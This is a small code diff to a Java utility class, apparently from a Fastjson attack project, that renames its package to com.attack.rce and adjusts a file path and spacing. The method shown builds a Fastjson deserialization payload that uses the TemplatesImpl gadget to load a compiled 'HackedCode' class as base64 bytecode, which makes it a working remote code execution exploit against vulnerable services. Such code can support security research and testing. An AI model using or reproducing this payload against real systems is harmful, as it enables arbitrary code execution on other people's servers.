@@ -1,4 +1,4 @@
-package com.fastJsonAttack;
+package com.attack.rce;
 
 import org.apache.commons.codec.binary.Base64;
 import org.apache.commons.io.IOUtils;
@@ -20,13 +20,13 @@ public class Utils {
     }
 
     public static String createMalformedContext() {
-        final String evilClassPath = System.getProperty("user.dir") + "\\build\\classes\\java\\main\\com\\fastJsonAttack\\HackedCode.class";
+        final String evilClassPath = System.getProperty("user.dir") + "/build/classes/java/main/com/attack/rce/HackedCode.class";
         String evilCode = readClass(evilClassPath);
         final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
         return "{\"@type\":\"" + NASTY_CLASS +
                 "\",\"_bytecodes\":[\""+evilCode+"\"]," +
                 "'_name':'a.b'," +
-                "'_tfactory':{ }," +
-                "\"_outputProperties\":{ }}\n";
+                "'_tfactory': {}," +
+                "\"_outputProperties\": {}}\n";
     }
 }
